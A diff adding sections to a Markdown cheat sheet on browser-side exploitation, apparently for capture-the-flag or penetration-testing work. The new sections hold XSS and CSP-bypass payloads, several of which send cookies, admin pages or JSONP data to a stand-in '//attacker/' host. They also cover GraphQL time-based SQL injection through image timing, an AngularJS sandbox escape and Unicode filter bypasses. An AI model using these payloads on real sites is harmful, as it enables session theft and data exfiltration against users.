@@ -10,6 +10,10 @@ Use this reference for DOM and browser-side exploitation: XSS, DOM sinks, CSP by
 - [Side channels and data exfiltration](#side-channels-and-data-exfiltration)
 - [Node and prototype pollution](#node-and-prototype-pollution)
 - [Framework notes](#framework-notes)
+- [Bot / headless-browser tricks](#bot--headless-browser-tricks)
+- [DOM sink recipes](#dom-sink-recipes)
+- [Scriptless / CSP-strict exfiltration](#scriptless--csp-strict-exfiltration)
+- [Reader-side tools](#reader-side-tools)
 
 ## Fast triage
 
@@ -116,7 +120,43 @@ Useful reminders:
 - Vue / template frameworks often expose constructor or render gadgets once escaping fails
 - bot challenges often weaken normal browser assumptions: special URL schemes, relaxed CSP, print dialogs, hidden admin actions
 
+## Bot / headless-browser tricks
+
+When the sink is an admin bot (Puppeteer/Playwright) rather than a live user:
+
+- **`javascript:` URL scheme via `new URL()`**: `new URL(input)` validates syntax only, not scheme. `javascript:fetch('/admin').then(r=>r.text()).then(t=>fetch('//attacker/?='+btoa(t)))` passes → Puppeteer navigates → executes in the bot's authenticated context. CSP/SRI on the target page are irrelevant (JS runs in navigation context, not page context).
+- **`<meta http-equiv="refresh">` redirect** bypasses `script-src` CSP and reaches the bot without JS execution. Useful when HTML injection is available but scripts are blocked.
+- **XS-Leak via image-load timing + GraphQL CSRF**: HTML injection → meta-refresh → bot visits attacker page → JS fires cross-origin `new Image().src = 'http://localhost/graphql?query={sqli(id:"'+guess+'")}'` — GraphQL GET requests bypass CORS preflight, and time-based SQLi (`SLEEP(1)`) is measured via the image `onerror` timing. Character-by-character flag exfil, one image request per candidate.
+- **Cross-origin cookie XSS on subdomains**: from one subdomain you control, set `Set-Cookie: xss=<payload>; domain=.parent.tld`. When the bot visits a sibling subdomain that reflects the cookie, the payload executes there — even if the sibling has no direct XSS sink.
+
+## DOM sink recipes
+
+Distinctive sinks worth remembering payload-first (context-first triage still applies, see [xss-and-dom-sinks](#xss-and-dom-sinks)):
+
+- **jQuery `$(location.hash)` + `hashchange`**: iframe the target with an empty hash, then mutate the hash so jQuery re-parses it as HTML: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=fetch(\'//attacker/?c=\'+document.cookie)>'">`.
+- **Shadow DOM (closed roots)**: intercept `Element.prototype.attachShadow` early to capture handles to *closed* shadow roots. Escape scope with indirect eval (`(0,eval)(payload)`) or `</script>` in an inline handler.
+- **DOM Clobbering + MIME mismatch**: an image upload served as `text/html` (misconfigured `Content-Type` or MIME sniffing) becomes an HTML document. `<form id="config"><input name="apiUrl" value="//attacker/">` clobbers `window.config.apiUrl` for scripts that read `config.apiUrl` without validation.
+- **AngularJS 1.x sandbox escape**: override `String.prototype.charAt = String.prototype.trim` so sandbox parsing misreads token boundaries, then `$eval("''.constructor.prototype.charAt=[].join;$eval('x=alert(1)')")`. Only relevant against legacy 1.x apps.
+- **Unicode case-folding XSS** (`ſ` → `s`): sanitizer regex uses ASCII-only matching (`<\s*script`), but downstream Go/Unicode-aware layer applies case folding (`strings.EqualFold`). `<ſcript>` (U+017F LATIN SMALL LETTER LONG S) evades the regex, folds to `<script>` at parse time. Cousin pairs: `ı`→`i`, `K` (U+212A KELVIN SIGN)→`k`.
+- **Chrome IDNA/Unicode URL normalization**: Chrome converts fullwidth Unicode (U+FF00–U+FF5E) to ASCII equivalents *after* length/character filters run — `ｅｖｉｌ.com` (fullwidth) passes ASCII-only filters and renders as `evil.com`.
+- **XSS dot-filter bypass**: when payloads must contain no `.`, use decimal IPs (`1558071511` == `92.223.45.87`) and bracket-notation property access (`document["cookie"]`, `window["location"]["href"]="//"+atob("...")`).
+
+## Scriptless / CSP-strict exfiltration
+
+When JS execution is fully blocked (strict CSP, Trusted Types, sanitizer coverage) but HTML/CSS injection is available:
+
+- **CSS Font Glyph + Container Queries**: a custom `@font-face` assigns unique glyph widths per character; a `@container` query fires `background-image: url(//attacker/?c=X)` on width ranges, one HTTP request per rendered character. Exfil inline text with zero JS under strict CSP.
+- **Hyperscript / Alpine.js via allow-listed CDN**: CSP `script-src cdnjs.cloudflare.com` opens `_hyperscript` (`_="on click fetch //attacker"`) and Alpine (`x-init`, `x-data="{$el.innerHTML=...}"`) — both execute code from HTML attributes that XSS sanitizers usually strip *tags* but not *attributes*.
+- **CSP nonce bypass via `<base>` tag**: strict `script-src 'nonce-xxx'` with a **missing `base-uri`** directive. Inject `<base href="//attacker/">` before a nonced `<script src="app.js">` — the relative script now loads from the attacker origin under a valid nonce. Fix: always set `base-uri 'self'`.
+- **CSP bypass via `<link rel="prefetch">` / `<meta http-equiv="refresh">`**: neither is covered by `script-src`; both make network requests carrying data in the URL. Useful when you have HTML injection but no JS sink.
+- **CSS/JS paywall bypass**: content hidden behind a `position:fixed; z-index:99999` overlay is still in the raw HTML — `curl` or `view-source:` reads it directly. Same for `display:none` flag holders and `data-*` attributes.
+
+## Reader-side tools
+
+- **JSFuck decoding**: remove the trailing `()()` invocation to keep it as an expression, then `Function(payload).toString()` (or eval in a sandboxed Node REPL) reveals the original code. Avoid running the invocation directly.
+- **XSSI via JSONP callback**: any endpoint that returns `func({...sensitive})` and honors `?callback=NAME` is loadable cross-origin with `<script src="//target/api?callback=steal">` — `window.steal = data => fetch('//attacker/?='+btoa(JSON.stringify(data)))`. Common in older APIs with `?callback=` reflecting into the response body.
+- **Client-side HMAC bypass via leaked JS secret**: deobfuscate client JS to find the hardcoded HMAC key, then forge signatures for arbitrary requests directly from the browser console (`crypto.subtle.sign(...)`).
+
 ## See also
 
-- `field-notes.md` — fast XSS, SSTI, JWT, and traversal reminders
 - `web-vulnerabilities-and-cves.md` — browser and framework CVEs
